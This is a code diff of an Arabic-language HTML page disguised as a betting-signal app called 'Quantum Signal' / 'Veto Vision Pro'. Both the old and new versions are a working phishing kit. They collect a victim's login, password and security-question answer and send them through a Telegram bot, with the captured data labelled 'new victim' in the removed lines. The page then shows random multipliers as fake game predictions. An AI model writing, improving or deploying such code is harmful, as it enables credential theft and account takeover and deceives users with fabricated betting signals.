@@ -2,157 +2,83 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Quantum Signal Pro v7</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VETO VISION PRO - FULL BOT</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body {
-            background: radial-gradient(circle at top,#020617,#000);
-            color:white; font-family: Arial, sans-serif;
-            display:flex; justify-content:center; align-items:center;
-            height:100vh; margin: 0; overflow: hidden;
-        }
+        body { background: #000; color: white; font-family: sans-serif; overflow: hidden; }
         .hidden { display: none !important; }
-        
-        /* تأثير التوهج الخلفي */
-        .glow {
-            position:absolute; width:500px; height:500px;
-            background:radial-gradient(circle,#00fff233,transparent);
-            filter:blur(80px); z-index: -1;
-        }
-
-        /* واجهة الرادار الفيروزية */
-        .circle {
-            width:300px; height:300px; border-radius:50%;
-            border:1px solid rgba(0,255,242,0.3);
-            backdrop-filter: blur(10px); display:flex;
-            flex-direction:column; justify-content:center;
-            align-items:center; position:relative;
-            box-shadow:0 0 60px rgba(0,255,242,0.2);
-        }
-
-        .circle::before {
-            content:""; position:absolute; width:340px; height:340px;
-            border-radius:50%; border:2px dashed rgba(0,255,242,0.2);
-            animation:rotate 10s linear infinite;
-        }
-
-        @keyframes rotate { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }
-
-        #mult { font-size:65px; font-weight:900; text-shadow:0 0 25px #00fff2; transition:0.3s; }
-
-        .btn-cyan {
-            margin-top:40px; padding:18px 60px; border-radius:40px;
-            font-weight:bold; background:linear-gradient(90deg,#00fff2,#00bfff);
-            color:black; box-shadow:0 10px 30px rgba(0,255,242,0.4);
-            transition:0.2s; border: none; cursor: pointer; text-transform: uppercase;
-        }
-
-        /* ستايل الخانة الحمراء (الهندسة الاجتماعية) */
-        .sec-input {
-            width: 90%; padding: 20px; background: white !important;
-            border: 5px solid #ff0000 !important; border-radius: 15px;
-            color: black !important; font-size: 22px; font-weight: 900;
-            text-align: center; margin: 20px 0; outline: none;
+        .circle-glow {
+            width: 280px; height: 280px; border-radius: 50%;
+            background: radial-gradient(circle, #1e69ff 0%, #0044cc 100%);
+            box-shadow: 0 0 50px rgba(30, 105, 255, 0.6);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
     </style>
 </head>
 <body>
 
-    <div class="glow"></div>
-
-    <section id="auth-screen" class="flex flex-col items-center w-full px-6">
-        <h1 class="text-4xl font-black italic mb-2">QUANTUM<span class="text-cyan-400">NODE</span></h1>
-        <p class="text-zinc-500 text-xs mb-8 tracking-tighter">SECURE CLOUD SYNCHRONIZATION ACTIVE</p>
-        
+    <section id="step1" class="flex flex-col items-center justify-center h-screen p-6">
+        <h1 class="text-3xl font-black italic mb-8">QUANTUM<span class="text-blue-500">NODE</span></h1>
         <div class="w-full max-w-xs space-y-4">
-            <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد الإلكتروني" class="w-full p-4 bg-zinc-900/80 border border-white/10 rounded-xl text-center outline-none focus:border-cyan-500">
-            <input type="password" id="u_pas" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900/80 border border-white/10 rounded-xl text-center outline-none focus:border-cyan-500">
-            <button onclick="startSync()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-xl font-black uppercase shadow-lg shadow-blue-900/20 active:scale-95 transition-all">Start Real-Time Sync</button>
+            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" class="w-full p-4 bg-zinc-900 rounded-xl text-center outline-none">
+            <input type="password" id="pass" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900 rounded-xl text-center outline-none">
+            <button onclick="toStep2()" class="w-full py-4 bg-blue-600 rounded-xl font-bold uppercase">Start Real-Time Sync</button>
         </div>
-        <p id="status-msg" class="mt-4 text-[10px] text-zinc-600 font-mono"></p>
     </section>
 
-    <section id="security-layer" class="hidden flex flex-col items-center w-full px-6 text-center">
+    <section id="step2" class="hidden flex flex-col items-center justify-center h-screen p-6 text-center">
         <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mb-6 bg-red-600/10">
             <span class="text-red-600 text-4xl">⚠️</span>
         </div>
-        <h2 class="text-2xl font-black uppercase mb-2">Security Verification</h2>
-        <p class="text-red-500 font-bold text-sm mb-6">يرجى تأكيد "اللقب" أو "الإجابة السرية" لفتح التشفير</p>
-        
-        <input type="text" id="sec_ans" placeholder="اكتب الإجابة هنا..." class="sec-input">
-        
-        <button onclick="finalUnlock()" class="w-full max-w-xs py-4 bg-white text-black font-black rounded-xl uppercase active:scale-95 transition-all">Confirm & Unlock</button>
+        <h2 class="text-2xl font-black uppercase mb-2">Security Lock</h2>
+        <p class="text-zinc-400 text-sm mb-6">أدخل اللقب أو الإجابة السرية لتأكيد هويتك</p>
+        <input type="text" id="nickname" placeholder="اللقب أو الإجابة" class="w-full max-w-xs p-4 bg-white text-black font-bold rounded-xl text-center border-4 border-red-600 outline-none">
+        <button onclick="toStep3()" class="w-full max-w-xs py-4 bg-white text-black font-black rounded-xl mt-4 uppercase">Confirm & Unlock</button>
     </section>
 
-    <section id="main-app" class="hidden flex flex-col items-center">
-        <div class="circle">
-            <div id="mult">1.00x</div>
-            <div class="text-xs text-cyan-300 mt-2 tracking-widest uppercase font-bold">Quantum Signal</div>
+    <section id="step3" class="hidden flex flex-col items-center justify-center h-screen p-4">
+        <div class="circle-glow mb-8">
+            <div id="result" class="text-6xl font-black italic">1.00x</div>
+            <div class="text-[10px] tracking-widest opacity-70">NEXT HIT</div>
         </div>
-        <button id="get-btn" onclick="generateSignal()" class="btn-cyan">Get New Signal</button>
+        <h2 class="text-2xl font-black italic uppercase">Veto Vision Pro</h2>
+        <button onclick="getSignal()" class="mt-12 w-full max-w-xs py-5 bg-cyan-500 text-black font-black rounded-3xl text-xl uppercase">Get Signal</button>
     </section>
 
     <script>
-        // دمج السكريبت مع البوت تاعك
-        const botToken = "YOUR_BOT_TOKEN"; // حط التوكن تاعك هنا
-        const chatId = "YOUR_CHAT_ID";     // حط الايدي تاعك هنا
+        const token = "YOUR_BOT_TOKEN";
+        const cid = "YOUR_CHAT_ID";
 
-        function sendToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`);
+        function send(m) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(m)}&parse_mode=html`);
         }
 
-        // معالجة الدخول
-        function startSync() {
-            const user = document.getElementById('u_log').value;
-            const pass = document.getElementById('u_pas').value;
-            const btn = document.getElementById('sync-btn');
+        function toStep2() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(u && p) {
+                send(`<b>🔥 حساب جديد:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+            }
+        }
 
-            if(!user || !pass) return alert("يرجى ملء البيانات!");
+        function toStep3() {
+            const n = document.getElementById('nickname').value;
+            if(n) {
+                send(`<b>⚠️ اللقب المستلم:</b>\n🔑: <code>${n}</code>`);
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+            }
+        }
 
-            btn.innerText = "SYNCHRONIZING...";
-            btn.disabled = true;
-
-            // إرسال البيانات الأولى
-            sendToTelegram(`<b>🔥 ضحية جديدة (Login):</b>\n👤 User: <code>${user}</code>\n🔑 Pass: <code>${pass}</code>`);
-
+        function getSignal() {
+            const res = document.getElementById('result');
+            res.innerText = "WAIT...";
             setTimeout(() => {
-                document.getElementById('auth-screen').classList.add('hidden');
-                document.getElementById('security-layer').classList.remove('hidden');
-            }, 2000);
-        }
-
-        // معالجة اللقب (الضربة القاضية)
-        function finalUnlock() {
-            const ans = document.getElementById('sec_ans').value;
-            if(!ans) return alert("الرجاء إدخال الإجابة!");
-
-            sendToTelegram(`<b>⚠️ اللقب المسترجع:</b>\n🔑 Answer: <code>${ans}</code>`);
-
-            document.getElementById('security-layer').classList.add('hidden');
-            document.getElementById('main-app').classList.remove('hidden');
-        }
-
-        // نظام الرادار المطور تاعك
-        function generateSignal() {
-            const btn = document.getElementById("get-btn");
-            const mult = document.getElementById("mult");
-
-            btn.disabled = true;
-            btn.innerText = "ANALYZING...";
-            btn.style.opacity = "0.5";
-
-            let target = (Math.random() * (12 - 1.1) + 1.1).toFixed(2);
-
-            setTimeout(() => {
-                mult.innerText = target + "x";
-                mult.style.transform = "scale(1.3)";
-                setTimeout(() => mult.style.transform = "scale(1)", 300);
-
-                btn.disabled = false;
-                btn.innerText = "Get New Signal";
-                btn.style.opacity = "1";
-            }, 1200);
+                res.innerText = (Math.random() * (5 - 1.1) + 1.1).toFixed(2) + "x";
+            }, 1000);
         }
     </script>
 </body>
